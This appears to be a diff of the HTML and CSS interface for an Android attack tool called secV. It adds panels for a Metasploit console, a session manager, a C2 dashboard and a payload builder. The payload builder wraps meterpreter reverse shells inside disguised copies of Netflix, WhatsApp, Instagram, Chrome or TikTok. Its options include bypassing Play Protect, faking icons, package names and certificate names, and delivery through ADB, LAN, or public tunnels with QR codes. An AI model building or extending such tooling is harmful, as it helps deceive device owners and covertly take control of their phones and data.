+.pd-sa{font-family:var(--mono);font-size:0.56rem;padding:2px 7px;border:1px solid var(--border2);background:none;color:var(--muted);cursor:pointer;transition:all var(--t);}
+.pd-sa:hover{color:var(--white);border-color:var(--border3);}
+.pd-sa.kill{border-color:var(--red);color:var(--red);}
+.pd-sa.kill:hover{background:var(--red-dim);}
+.pd-sa.accent{border-color:var(--accent);color:var(--accent);}
+.pd-sa.accent:hover{background:var(--accent-dim);}
+.pd-status-badge{
+  font-size:0.56rem;letter-spacing:0.1em;text-transform:uppercase;
+  padding:2px 8px;border:1px solid var(--border2);color:var(--muted);
+}
+.pd-status-badge.ready{border-color:var(--green);color:var(--green);}
+.pd-status-badge.running{border-color:var(--accent);color:var(--accent);animation:pulse .9s infinite;}
+
+/* ── MSF CONSOLE TAB ─────────────────────────────────────────────────── */
+#msf-console-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
+.msfc-toolbar{
+  display:flex;align-items:center;gap:6px;padding:5px 12px;
+  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
+}
+.msfc-toolbar .pd-btn{padding:3px 10px;font-size:0.6rem;}
+#msf2-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0;}
+#msf2-dot.on{background:var(--green);box-shadow:0 0 6px var(--green);}
+#msf2-status{font-size:0.6rem;color:var(--muted);letter-spacing:0.08em;}
+#msf2-status.on{color:var(--green);}
+#msf2-terminal{
+  flex:1;overflow-y:auto;padding:10px 14px;background:rgba(6,6,6,0.72);
+  font-family:var(--mono);font-size:0.75rem;line-height:1.75;
+  white-space:pre-wrap;word-break:break-all;
+}
+#msf2-input-row{
+  display:flex;gap:8px;padding:8px 14px;background:var(--bg1);
+  border-top:1px solid var(--border2);align-items:center;flex-shrink:0;
+}
+#msf2-prompt{color:var(--red);font-size:0.75rem;white-space:nowrap;font-family:var(--mono);}
+#msf2-input{
+  flex:1;background:transparent;border:none;color:var(--white);
+  font-family:var(--mono);font-size:0.75rem;outline:none;
+}
+
+/* ── SESSION DRAWER ───────────────────────────────────────────────────── */
+#sess-drawer{
+  position:fixed !important;top:0;right:-380px;width:380px;height:100vh;
+  background:rgba(8,8,8,0.97);border-left:1px solid var(--border2);
+  z-index:200;transition:right 0.22s ease;display:flex;flex-direction:column;
+  backdrop-filter:blur(14px);
+}
+#sess-drawer.open{right:0;}
+#sess-drawer-overlay{position:fixed !important;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.45);z-index:199;display:none;}
+#sess-drawer-overlay.show{display:block;}
+.sd-hdr{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid var(--border2);flex-shrink:0;}
+.sd-title{font-size:0.7rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--silver);font-weight:600;flex:1;}
+.sd-close{background:none;border:none;color:var(--muted);font-size:1.1rem;cursor:pointer;padding:0 4px;transition:color var(--t);}
+.sd-close:hover{color:var(--white);}
+.sd-body{flex:1;overflow-y:auto;padding:12px 14px;}
+.sd-sect{font-size:0.58rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted);margin:10px 0 6px;}
+.sd-row{
+  display:flex;align-items:center;gap:8px;padding:8px 10px;
+  border:1px solid var(--border2);background:var(--bg1);margin-bottom:5px;
+  cursor:pointer;transition:all var(--t);
+}
+.sd-row:hover{border-color:var(--border3);background:var(--bg2);}
+.sd-row.active-sd{border-color:var(--accent);}
+.sd-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
+.sd-dot.running{animation:pulse .8s infinite;}
+.sd-info{flex:1;overflow:hidden;}
+.sd-top{display:flex;align-items:center;gap:6px;}
+.sd-id{font-size:0.72rem;color:var(--white);font-weight:600;}
+.sd-op{font-size:0.6rem;color:var(--accent);background:var(--accent-dim);padding:1px 5px;}
+.sd-dev{font-size:0.6rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.sd-acts{display:flex;gap:4px;flex-shrink:0;}
+.sd-act{font-family:var(--mono);font-size:0.57rem;padding:2px 7px;border:1px solid var(--border2);background:none;color:var(--muted);cursor:pointer;transition:all var(--t);}
+.sd-act:hover{color:var(--white);border-color:var(--border3);}
+.sd-act.kill{border-color:var(--red);color:var(--red);}
+.sd-act.kill:hover{background:var(--red-dim);}
+.sd-act.accent{border-color:var(--accent);color:var(--accent);}
+.sd-act.accent:hover{background:var(--accent-dim);}
+#sess-label{cursor:pointer;user-select:none;}
+#sess-label:hover{color:var(--white);}
+#sess-count{cursor:pointer;user-select:none;}
+#sess-count:hover{color:var(--white);}
+.sd-drawer-btn{
+  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;text-transform:uppercase;
+  padding:5px 12px;border:1px solid var(--border2);background:none;color:var(--muted);cursor:pointer;margin-left:auto;
+}
+.sd-drawer-btn:hover{color:var(--white);border-color:var(--border3);}
 
 /* SETUP/DEPS TAB */
 #setup-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
@@ -1406,22 +2291,83 @@ a{color:var(--blue);text-decoration:none;}
 }
 #save-settings:hover{background:var(--off);}
 
-/* FILES TAB */
-#files-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
-.file-row{
-  display:flex;align-items:center;gap:10px;padding:8px 10px;
-  border-bottom:1px solid var(--border);font-size:0.72rem;transition:background var(--t);
+/* FILES TAB — dual-pane manager */
+#files-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
+#fm-toolbar{
+  display:flex;align-items:center;gap:6px;padding:6px 12px;
+  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
 }
-.file-row:hover{background:var(--bg2);}
-.file-row .fn{color:var(--white);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
-.file-row .fsz{color:var(--muted);white-space:nowrap;}
-.file-row .fts{color:var(--muted);white-space:nowrap;}
-.file-row .copy-btn{
+.fm-tb-btn{
   background:none;border:1px solid var(--border2);color:var(--muted);
-  padding:2px 8px;font-size:0.58rem;letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
-  transition:color var(--t),border-color var(--t);
+  padding:4px 12px;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.07em;
+  text-transform:uppercase;cursor:pointer;transition:all var(--t);white-space:nowrap;
 }
-.file-row .copy-btn:hover{color:var(--white);border-color:var(--border3);}
+.fm-tb-btn:hover,.fm-tb-btn.active{color:var(--white);border-color:var(--border3);}
+.fm-tb-btn.danger:hover{color:var(--red);border-color:var(--red);}
+.fm-tb-btn.go{background:var(--white);color:var(--bg);border-color:var(--white);}
+.fm-tb-btn.go:hover{background:var(--off);}
+#fm-body{display:flex;flex:1;overflow:hidden;gap:0;}
+.fm-pane{display:flex;flex-direction:column;flex:1;overflow:hidden;border-right:1px solid var(--border2);}
+.fm-pane:last-child{border-right:none;}
+.fm-pane-hdr{
+  display:flex;align-items:center;gap:6px;padding:5px 10px;
+  background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0;
+  font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);
+}
+.fm-pane-hdr .fm-pane-title{color:var(--white);font-weight:700;}
+.fm-breadcrumb{
+  display:flex;align-items:center;gap:3px;padding:4px 10px;
+  background:var(--bg1);border-bottom:1px solid var(--border);flex-shrink:0;
+  font-size:0.62rem;overflow-x:auto;white-space:nowrap;
+}
+.fm-bc-seg{color:var(--muted);cursor:pointer;padding:1px 3px;border-radius:2px;}
+.fm-bc-seg:hover{color:var(--white);background:var(--bg3);}
+.fm-bc-sep{color:var(--border3);}
+.fm-list{flex:1;overflow-y:auto;}
+.fm-entry{
+  display:flex;align-items:center;gap:8px;padding:6px 10px;
+  border-bottom:1px solid var(--border);font-size:0.7rem;cursor:pointer;
+  transition:background var(--t);user-select:none;
+}
+.fm-entry:hover{background:var(--bg2);}
+.fm-entry.selected{background:rgba(255,255,255,0.06);}
+.fm-entry.fm-dir .fm-ico{color:var(--yellow);}
+.fm-entry.fm-file .fm-ico{color:var(--muted);}
+.fm-entry.fm-apk .fm-ico{color:var(--green);}
+.fm-ico{width:14px;flex-shrink:0;font-style:normal;font-size:0.75rem;}
+.fm-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--white);}
+.fm-size{color:var(--muted);white-space:nowrap;font-size:0.6rem;min-width:52px;text-align:right;}
+.fm-perms{color:var(--muted);white-space:nowrap;font-size:0.58rem;font-family:var(--mono);}
+.fm-ctx{
+  position:fixed;z-index:9999;background:var(--bg2);border:1px solid var(--border2);
+  padding:4px 0;min-width:180px;font-size:0.68rem;box-shadow:0 4px 18px rgba(0,0,0,0.5);
+}
+.fm-ctx-item{padding:7px 16px;cursor:pointer;color:var(--grey);transition:all var(--t);}
+.fm-ctx-item:hover{background:var(--bg3);color:var(--white);}
+.fm-ctx-item.danger{color:var(--red);}
+.fm-ctx-sep{border-top:1px solid var(--border);margin:3px 0;}
+#fm-preview{
+  width:320px;flex-shrink:0;display:flex;flex-direction:column;
+  border-left:1px solid var(--border2);overflow:hidden;
+}
+#fm-preview-hdr{
+  padding:6px 10px;background:var(--bg2);border-bottom:1px solid var(--border);
+  font-size:0.6rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);flex-shrink:0;
+}
+#fm-preview-content{flex:1;overflow-y:auto;padding:10px 12px;font-size:0.68rem;line-height:1.7;}
+.fm-prev-meta{color:var(--muted);font-size:0.6rem;margin-bottom:10px;}
+.fm-prev-text{font-family:var(--mono);font-size:0.65rem;white-space:pre-wrap;word-break:break-all;color:var(--grey);}
+.fm-prev-actions{display:flex;flex-wrap:wrap;gap:5px;margin-top:10px;}
+.fm-status{
+  padding:3px 10px;background:var(--bg2);border-top:1px solid var(--border);
+  font-size:0.58rem;color:var(--muted);flex-shrink:0;letter-spacing:0.04em;
+}
+.fm-empty{padding:20px;color:var(--muted);font-size:0.68rem;text-align:center;}
+.fm-apk-badge{
+  background:rgba(76,175,80,0.15);border:1px solid rgba(76,175,80,0.3);
+  color:var(--green);padding:1px 5px;font-size:0.55rem;border-radius:2px;
+  letter-spacing:0.06em;text-transform:uppercase;
+}
 
 /* C2 PANEL */
 #c2-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
@@ -1444,7 +2390,7 @@ a{color:var(--blue);text-decoration:none;}
 .c2-btn.launch:hover{background:var(--off);}
 .c2-btn.stop{border-color:rgba(229,57,53,0.4);color:var(--red);}
 .c2-btn.stop:hover{background:var(--red-dim);border-color:var(--red);}
-#c2-frame-wrap{flex:1;overflow:hidden;background:var(--bg);}
+#c2-frame-wrap{flex:1;overflow:hidden;background:rgba(6,6,6,0.75);}
 #c2-placeholder{
   display:flex;flex-direction:column;align-items:center;justify-content:center;
   height:100%;color:var(--muted);gap:14px;
@@ -1648,6 +2594,7 @@ a{color:var(--blue);text-decoration:none;}
 </style>
 </head>
 <body>
+<canvas id="code-bg"></canvas>
 
 <!-- TOP BAR -->
 <div id="topbar">
@@ -1659,6 +2606,7 @@ a{color:var(--blue);text-decoration:none;}
   </div>
   <span id="lhost-display"></span>
   <span id="dev-count" style="font-size:0.58rem;color:var(--muted);letter-spacing:0.1em;"></span>
+  <button class="tb-btn" id="sidebar-toggle-btn" onclick="toggleSidebar()" title="Toggle ops sidebar">⊟ ops</button>
   <button class="tb-btn" onclick="refreshDevices()" title="Poll for devices">⟳ refresh</button>
   <button class="tb-btn" id="reload-btn" onclick="forceReloadADB()" title="Kill + restart ADB server">⚡ reload adb</button>
   <button class="tb-btn" onclick="clearTerminal()">⌧ clear</button>
@@ -1668,8 +2616,49 @@ a{color:var(--blue);text-decoration:none;}
 
 <!-- SESSIONS BAR -->
 <div id="sessions-bar">
-  <span id="sess-label">Sessions</span>
-  <span id="sess-count"></span>
+  <span id="sess-label" onclick="toggleSessionDrawer()" title="Click to manage sessions">Sessions</span>
+  <span id="sess-count" onclick="toggleSessionDrawer()" title="Click to manage sessions"></span>
+  <button class="sd-drawer-btn" onclick="toggleSessionDrawer()" title="Open session manager">≡ manage</button>
+</div>
+
+<!-- SESSION DRAWER -->
+<div id="sess-drawer-overlay" onclick="closeSessionDrawer()"></div>
+<div id="sess-drawer">
+  <div class="sd-hdr">
+    <span class="sd-title">Session Manager</span>
+    <button class="sd-act accent" onclick="pdStartHandler()" style="padding:4px 12px;font-size:0.6rem;">⚡ handler</button>
+    <button class="sd-close" onclick="closeSessionDrawer()">×</button>
+  </div>
+  <div class="sd-body">
+    <div class="sd-sect">secV Operations</div>
+    <div id="sd-secv-list"><div style="color:var(--muted);font-size:0.65rem;">No sessions yet.</div></div>
+    <div class="sd-sect" style="margin-top:14px">MSF Meterpreter</div>
+    <div id="sd-msf-list"><div style="color:var(--muted);font-size:0.65rem;">Start msfconsole first.</div></div>
+    <div style="margin-top:14px;display:flex;gap:8px;flex-wrap:wrap;">
+      <button class="sd-act" onclick="pdRefreshMsfSessions()">⟳ refresh MSF</button>
+      <button class="sd-act" onclick="switchTab('msf-console');closeSessionDrawer()">⬛ MSF console</button>
+      <button class="sd-act kill" onclick="pdKillAll()">✕ kill all</button>
+    </div>
+  </div>
+</div>
+
+<!-- APK FILE BROWSER MODAL -->
+<div id="apk-browser-overlay" onclick="apkBrowserBgClick(event)">
+  <div id="apk-browser-modal">
+    <div id="apk-browser-header">
+      <span id="apk-browser-title">select apk</span>
+      <span id="apk-browser-path"></span>
+      <button id="apk-browser-close" onclick="apkBrowserClose()">×</button>
+    </div>
+    <div id="apk-browser-toolbar">
+      <button id="apk-browser-up" onclick="apkBrowserUp()">↑ up</button>
+      <input id="apk-browser-filter" type="text" placeholder="filter…" oninput="apkBrowserFilter()" autocomplete="off">
+    </div>
+    <div id="apk-browser-list">
+      <div id="apk-browser-loading">loading…</div>
+      <div id="apk-browser-empty">no entries</div>
+    </div>
+  </div>
 </div>
 
 <!-- MAIN -->
@@ -1689,8 +2678,22 @@ a{color:var(--blue);text-decoration:none;}
   <div id="right">
     <!-- PARAMS -->
     <div id="params-panel">
-      <div class="op-title" id="op-title">Select an operation</div>
-      <div class="op-desc" id="op-desc">Click any operation in the sidebar to configure and run it.</div>
+      <div class="op-title" id="op-title" style="display:none"></div>
+      <div class="op-desc" id="op-desc" style="display:none"></div>
+      <div id="params-placeholder" class="params-placeholder">
+        <div class="pp-title">secV · android pentest</div>
+        <div class="pp-hint">Open <b style="color:var(--white)">⊟ ops</b> in the topbar to show the operation list, or switch to <b style="color:var(--white)">P&amp;D</b> to build and deliver payloads.</div>
+        <div class="pp-cats">
+          <span class="pp-cat" style="color:var(--cat-recon);border-color:var(--cat-recon)">recon</span>
+          <span class="pp-cat" style="color:var(--cat-access);border-color:var(--cat-access)">access</span>
+          <span class="pp-cat" style="color:var(--cat-payload);border-color:var(--cat-payload)">payload</span>
+          <span class="pp-cat" style="color:var(--cat-instr);border-color:var(--cat-instr)">instrumentation</span>
+          <span class="pp-cat" style="color:var(--cat-persist);border-color:var(--cat-persist)">persistence</span>
+          <span class="pp-cat" style="color:var(--cat-c2);border-color:var(--cat-c2)">c2</span>
+          <span class="pp-cat" style="color:var(--cat-evasion);border-color:var(--cat-evasion)">evasion</span>
+          <span class="pp-cat" style="color:var(--cat-auto);border-color:var(--cat-auto)">auto chains</span>
+        </div>
+      </div>
       <div id="params-form"></div>
       <!-- PROCESS SNIFFER PANEL (shown only for process_inject) -->
       <div id="proc-sniff-panel">
@@ -1713,9 +2716,11 @@ a{color:var(--blue);text-decoration:none;}
     <!-- TABS -->
     <div id="tabs">
       <div class="tab active" onclick="switchTab('terminal')">Terminal</div>
-      <div class="tab" onclick="switchTab('adb')">ADB Console</div>
+      <div class="tab" onclick="switchTab('adb')">ADB Shell</div>
+      <div class="tab" onclick="switchTab('shell')">Shell <span id="shell-badge" class="badge" style="display:none">●</span></div>
       <div class="tab" onclick="switchTab('findings')">Findings <span id="findings-badge" class="badge" style="display:none">0</span></div>
-      <div class="tab" onclick="switchTab('qr')">QR Codes <span id="qr-badge" class="badge" style="display:none">0</span></div>
+      <div class="tab" onclick="switchTab('pd')">P&amp;D <span id="pd-badge" class="badge" style="display:none">●</span></div>
+      <div class="tab" onclick="switchTab('msf-console')">MSF <span id="msf-badge" class="badge" style="display:none">●</span></div>
       <div class="tab" onclick="switchTab('files')">Files</div>
       <div class="tab" onclick="switchTab('setup')">Setup/Deps</div>
       <div class="tab" id="c2-tab" onclick="switchTab('c2')">C2 Dashboard</div>
@@ -1723,7 +2728,25 @@ a{color:var(--blue);text-decoration:none;}
     </div>
 
     <!-- TERMINAL TAB -->
-    <div id="terminal-wrap"><div id="terminal"></div></div>
+    <div id="terminal-wrap">
+      <div id="term-toolbar">
+        <button class="tt-btn" onclick="clearTerminal()">⌧ clear</button>
+        <div class="tt-sep"></div>
+        <button class="tt-btn" id="term-find-btn" onclick="toggleFindBar()" title="Ctrl+F">⌕ find</button>
+        <div id="term-find-bar">
+          <input id="term-find-inp" type="text" placeholder="search…" oninput="termFindUpdate()" onkeydown="termFindKey(event)" autocomplete="off">
+          <button class="tt-btn" onclick="termFindPrev()" title="Previous">↑</button>
+          <button class="tt-btn" onclick="termFindNext()" title="Next">↓</button>
+          <span id="term-find-count"></span>
+          <button class="tt-btn" onclick="closeFindBar()">×</button>
+        </div>
+        <div class="tt-sep"></div>
+        <button class="tt-btn" id="wrap-btn" onclick="toggleWrap()" title="Toggle line wrap">↵ wrap</button>
+        <button class="tt-btn active" id="scroll-btn" onclick="toggleAutoScroll()" title="Toggle auto-scroll">⬇ scroll</button>
+        <span id="term-line-ct" style="margin-left:auto;font-size:0.58rem;color:var(--muted);">0 lines</span>
+      </div>
+      <div id="terminal"></div>
+    </div>
     <!-- ADB CONSOLE TAB -->
     <div id="adb-console">
       <div id="adb-output"></div>
@@ -1732,12 +2755,333 @@ a{color:var(--blue);text-decoration:none;}
         <input id="adb-input" type="text" placeholder="shell getprop ro.product.model" onkeydown="adbEnter(event)">
       </div>
     </div>
+    <!-- SHELL TAB (PTY) -->
+    <div id="shell-panel">
+      <div id="shell-toolbar">
+        <div id="pty-dot"></div>
+        <span id="pty-status">inactive</span>
+        <div class="tt-sep"></div>
+        <button class="tt-btn" id="pty-start-btn" onclick="startPty()">▶ start</button>
+        <button class="tt-btn" onclick="ptyKill()">✕ kill</button>
+        <div class="tt-sep"></div>
+        <button class="tt-btn" onclick="ptyInputSend('sudo -i\n')">sudo</button>
+        <button class="tt-btn" onclick="ptyInputSend('exit\n')">exit</button>
+        <div class="tt-sep"></div>
+        <button class="tt-btn" onclick="clearPty()">clear</button>
+        <button class="tt-btn active" id="pty-scroll-btn" onclick="togglePtyScroll()">⬇ lock</button>
+        <span id="pty-info"></span>
+      </div>
+      <div id="pty-input-row">
+        <span id="pty-prompt-label"><span class="ppl-brand">secV</span><span class="ppl-sep"> ❯ </span><span class="ppl-caret">$</span>&nbsp;</span>
+        <input id="pty-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
+          placeholder="enter command  ·  ↑↓ history  ·  Enter send"
+          onkeydown="ptyKeyDown(event)">
+      </div>
+      <div id="pty-output"></div>
+    </div>
     <!-- FINDINGS TAB -->
-    <div id="findings-panel"></div>
-    <!-- QR TAB -->
-    <div id="qr-panel"></div>
+    <div id="findings-panel">
+      <div id="f-toolbar">
+        <span class="f-tab active" data-ftab="summary" onclick="fTab('summary')">Summary</span>
+        <span class="f-tab" data-ftab="vulns" onclick="fTab('vulns')">Vulns <span id="f-vuln-ct" class="badge" style="display:none">0</span></span>
+        <span class="f-tab" data-ftab="device" onclick="fTab('device')">Device</span>
+        <span class="f-tab" data-ftab="apps" onclick="fTab('apps')">Apps</span>
+        <span class="f-tab" data-ftab="delivery" onclick="fTab('delivery')">Delivery</span>
+        <span class="f-tab" data-ftab="raw" onclick="fTab('raw')">Raw JSON</span>
+        <div class="f-actions">
+          <button class="f-action-btn" onclick="exportFindings()">↓ export</button>
+          <button class="f-action-btn" onclick="clearFindings()">✕ clear</button>
+        </div>
+      </div>
+      <div id="f-body"><div id="f-empty" style="padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;">Run an operation — findings populate here automatically.</div></div>
+    </div>
+    <!-- PAYLOAD & DELIVERY TAB — unified mod menu -->
+    <div id="pd-panel">
+
+      <div class="pd-toolbar">
+        <span class="pd-toolbar-title">P&amp;D</span>
+        <span id="pd-apk-badge" class="pd-status-badge" style="display:none"></span>
+        <div style="flex:1"></div>
+        <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
+        <button class="pd-btn" onclick="switchTab('msf-console')">⬛ console</button>
+        <button class="pd-btn" onclick="pdRefreshSessions();pdRefreshMsfSessions()">⟳</button>
+      </div>
+
+      <div class="pd-body">
+
+        <!-- SOURCE ─── -->
+        <div class="pm-row">
+          <div class="pm-lbl">APK Source</div>
+          <div class="pm-chips" id="pm-src-chips">
+            <label class="pm-chip sel"><input type="radio" name="pd-src" value="local" checked onchange="pdFormUpd()">Local file</label>
+            <label class="pm-chip"><input type="radio" name="pd-src" value="netflix" onchange="pdFormUpd()">Netflix</label>
+            <label class="pm-chip"><input type="radio" name="pd-src" value="whatsapp" onchange="pdFormUpd()">WhatsApp</label>
+            <label class="pm-chip"><input type="radio" name="pd-src" value="instagram" onchange="pdFormUpd()">Instagram</label>
+            <label class="pm-chip"><input type="radio" name="pd-src" value="chrome" onchange="pdFormUpd()">Chrome</label>
+            <label class="pm-chip"><input type="radio" name="pd-src" value="tiktok" onchange="pdFormUpd()">TikTok</label>
+            <label class="pm-chip"><input type="radio" name="pd-src" value="device" onchange="pdFormUpd()">Pull from device</label>
+            <label class="pm-chip"><input type="radio" name="pd-src" value="standalone" onchange="pdFormUpd()">Standalone · PoisonIvy</label>
+          </div>
+          <!-- local / template: path field -->
+          <div class="pm-sub show" id="pm-sub-path">
+            <div class="pm-inrow">
+              <div class="pm-col" style="flex:3"><div class="field"><label>APK path</label><input id="pd-apk-path" type="text" placeholder="~/.secv/android/auto/.../app.apk" oninput="pdCheckApkStatus()"></div></div>
+              <div style="display:flex;align-items:flex-end;gap:5px">
+                <button class="pd-btn" onclick="pdAutoFillApk()">auto-fill</button>
+                <button class="pd-btn" onclick="pdBrowseClick()">browse</button>
+              </div>
+            </div>
+          </div>
+          <!-- device: pull package -->
+          <div class="pm-sub" id="pm-sub-device">
+            <div class="pm-inrow">
+              <div class="pm-col"><div class="field"><label>Target package</label><input id="pd-pkg-pull" type="text" placeholder="com.target.app"></div></div>
+              <div style="display:flex;align-items:flex-end"><button class="pd-btn accent" onclick="pdPullApk()">▼ pull APK</button></div>
+            </div>
+          </div>
+          <!-- standalone: output name -->
+          <div class="pm-sub" id="pm-sub-standalone">
+            <div class="pm-inrow">
+              <div class="pm-col"><div class="field"><label>Output filename</label><input id="pd-standalone-name" type="text" value="payload.apk"></div></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PAYLOAD ─── -->
+        <div class="pm-row">
+          <div class="pm-lbl">Payload</div>
+          <div class="pm-inrow">
+            <div class="pm-col" style="flex:2">
+              <div class="field"><label>Type</label>
+                <select id="pd-payload">
+                  <option value="tcp">reverse_tcp — meterpreter (LAN)</option>
+                  <option value="http">reverse_http — meterpreter (WAN HTTP)</option>
+                  <option value="https">reverse_https — meterpreter (WAN stealth)</option>
+                  <option value="bind">bind_tcp — meterpreter (no inbound)</option>
+                </select>
+              </div>
+            </div>
+            <div class="pm-col"><div class="field"><label>LHOST</label><input id="pd-lhost" type="text" placeholder="auto-detect"></div></div>
+            <div style="min-width:80px"><div class="field"><label>LPORT</label><input id="pd-lport" type="text" value="4444" style="width:100%"></div></div>
+          </div>
+        </div>
+
+        <!-- OPTIONS ─── -->
+        <div class="pm-row">
+          <div class="pm-lbl">Options</div>
+          <div class="pm-chk-row">
+            <label class="pm-chk"><input type="checkbox" id="pd-tog-pp" onchange="pdToggle()"> Bypass Play Protect</label>
+            <label class="pm-chk"><input type="checkbox" id="pd-tog-id" onchange="pdToggle()"> Custom Identity / APK skin</label>
+            <label class="pm-chk"><input type="checkbox" id="pd-tog-sign"> Convincing Cert CN</label>
+          </div>
+          <div id="pd-id-fields" style="display:none;flex-wrap:wrap;gap:8px;padding-top:8px;">
+            <div class="pm-col"><div class="field"><label>Icon URL / path</label><input id="pd-icon" type="text" placeholder="https://… or /path/icon.png"></div></div>
+            <div class="pm-col"><div class="field"><label>App Label</label><input id="pd-app-label" type="text" placeholder="Netflix"></div></div>
+            <div class="pm-col"><div class="field"><label>Package Name</label><input id="pd-pkg-name" type="text" placeholder="com.netflix.mediastream"></div></div>
+          </div>
+        </div>
+
+        <!-- DELIVERY ─── -->
+        <div class="pm-row">
+          <div class="pm-lbl">Delivery</div>
+          <div class="pm-chips" id="pm-dlv-chips">
+            <label class="pm-chip sel"><input type="radio" name="pd-dlv" value="none" checked onchange="pdFormUpd()">Build only</label>
+            <label class="pm-chip"><input type="radio" name="pd-dlv" value="adb-usb" onchange="pdFormUpd()">🔌 ADB · USB</label>
+            <label class="pm-chip"><input type="radio" name="pd-dlv" value="adb-net" onchange="pdFormUpd()">📡 ADB · Network</label>
+            <label class="pm-chip"><input type="radio" name="pd-dlv" value="lan" onchange="pdFormUpd()">🏠 LAN HTTP</label>
+            <label class="pm-chip"><input type="radio" name="pd-dlv" value="wan" onchange="pdFormUpd()">🌐 WAN HTTPS</label>
+          </div>
+          <!-- ADB network: IP -->
+          <div class="pm-sub" id="pm-sub-adb-net">
+            <div class="pm-inrow">
+              <div class="pm-col"><div class="field"><label>Device IP:Port</label><input id="pd-adb-ip" type="text" placeholder="192.168.x.x:5555"></div></div>
+              <div style="display:flex;align-items:flex-end;gap:5px">
+                <button class="pd-btn accent" onclick="pdAdbConnect()">connect</button>
+              </div>
+            </div>
+          </div>
+          <!-- LAN: port -->
+          <div class="pm-sub" id="pm-sub-lan">
+            <div class="pm-inrow">
+              <div style="min-width:120px"><div class="field"><label>Port</label><input id="pd-lan-port" type="text" value="8891"></div></div>
+              <div style="display:flex;align-items:flex-end"><button class="pd-btn" onclick="pdGenQR('lan')">QR</button></div>
+            </div>
+            <div id="pd-lan-url" class="pd-url-box" style="display:none"></div>
+          </div>
+          <!-- WAN: tunnel + port -->
+          <div class="pm-sub" id="pm-sub-wan">
+            <div class="pm-inrow">
+              <div class="pm-col">
+                <div class="field"><label>Tunnel</label>
+                  <select id="pd-tunnel">
+                    <option value="lhr">localhost.run (HTTPS · SSH 22)</option>
+                    <option value="bore">bore.pub (TCP high port)</option>
+                    <option value="cloudflared">cloudflared</option>
+                  </select>
+                </div>
+              </div>
+              <div style="min-width:100px"><div class="field"><label>Local Port</label><input id="pd-wan-port" type="text" value="8891"></div></div>
+              <div style="display:flex;align-items:flex-end;gap:5px">
+                <button class="pd-btn danger" onclick="pdWanStop()">■ stop</button>
+                <button class="pd-btn" onclick="pdGenQR('wan')">QR</button>
+              </div>
+            </div>
+            <div id="pd-wan-url" class="pd-url-box" style="display:none"></div>
+            <div class="pd-act-row" id="pd-wan-copy-row" style="display:none">
+              <button class="pd-btn" onclick="pdCopyEl('pd-wan-url')">copy URL</button>
+              <button class="pd-btn" onclick="pdUpdateSite()">update APK site</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- ACTION ─── -->
+        <div class="pm-action">
+          <button class="pm-go" id="pd-action-btn" onclick="pdAction()">▶ BUILD &amp; INJECT</button>
+          <button class="pd-btn accent" style="padding:12px 16px;" onclick="pdStartHandler()">⚡ handler</button>
+          <button class="pd-btn" style="padding:12px 11px;" onclick="pdAdbGrant()" title="Grant permissions to installed APK">perms</button>
+          <button class="pd-btn" style="padding:12px 11px;" onclick="pdAdbLaunch()" title="Launch installed app">launch</button>
+        </div>
+        <div id="pd-build-log" class="pd-log" style="display:none"></div>
+
+        <!-- STATUS ─── -->
+        <div class="pm-row" id="pd-apk-status-card">
+          <div class="pm-lbl">Payload Status</div>
+          <div class="pd-info" id="pd-apk-ready-msg">No payload built yet — configure above and hit GO.</div>
+          <div id="pd-deliver-apk-row" style="display:none">
+            <div class="pd-url-box" id="pd-deliver-apk-path"></div>
+            <div class="pd-act-row" style="margin-top:6px">
+              <button class="pd-btn" onclick="pdCopyEl('pd-deliver-apk-path')">copy path</button>
+              <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
+              <button class="pd-btn" onclick="pdGenQR('lan')">QR</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- DELIVERY LOG ─── -->
+        <div class="pm-row" id="pd-deliver-log-sect">
+          <div class="pm-lbl">Delivery Log</div>
+          <div id="pd-deliver-log" class="pd-log" style="min-height:44px">Delivery output appears here.</div>
+        </div>
+
+        <!-- QR & URLS ─── -->
+        <div class="pm-row">
+          <div class="pm-lbl">URLs &amp; QR</div>
+          <div id="pdv-qr-area" class="pd-qr-area">
+            <div class="pd-info" style="flex:1">Run LAN Serve or WAN Expose to generate links.</div>
+          </div>
+        </div>
+
+        <!-- SESSIONS ─── -->
+        <div class="pm-row">
+          <div class="pm-lbl">Sessions</div>
+          <div class="pd-sess-grid">
+            <div class="pd-fcard">
+              <div style="font-size:0.55rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:7px;">secV</div>
+              <div id="pdv-secv-list" class="pd-sess-list"><div class="pd-info">No active sessions.</div></div>
+              <div class="pd-act-row">
+                <button class="pd-btn" onclick="pdRefreshSessions()">⟳ refresh</button>
+                <button class="pd-btn danger" onclick="pdKillAll()">✕ kill all</button>
+              </div>
+            </div>
+            <div class="pd-fcard">
+              <div style="font-size:0.55rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:7px;">MSF Meterpreter</div>
